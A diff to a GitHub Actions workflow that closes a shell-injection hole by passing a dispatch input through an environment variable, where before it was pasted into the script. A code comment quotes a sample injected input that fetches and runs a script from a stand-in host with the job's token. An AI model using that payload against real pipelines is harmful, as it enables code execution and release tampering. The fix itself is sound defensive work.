@@ -104,10 +104,17 @@ jobs:
       # them, absent from a release nobody would have looked at twice.
       - name: Choose the layer files
         id: layers
+        env:
+          # ⚑ Through the environment, not `${{ }}` inside the script. An
+          # interpolated input is pasted into the shell before bash ever sees
+          # it, so `a.yaml"; curl evil.sh | sh; "` runs as this job — with the
+          # workflow's token, on a runner that is about to sign and publish an
+          # artifact. `$INPUT_LAYERS` is a string to bash whatever it contains.
+          INPUT_LAYERS: ${{ github.event.inputs.layers }}
         run: |
           set -euo pipefail
           LEXICON="${MORPH_DIR}/lexicon/cs"
-          FOUND="${{ github.event.inputs.layers }}"
+          FOUND="${INPUT_LAYERS:-}"
           if [ -z "$FOUND" ]; then
             FOUND=$(grep -v '^[[:space:]]*\(#\|$\)' "${LEXICON}/LAYERS" \
                     | sed "s|^|${LEXICON}/|" | tr '\n' ' ')
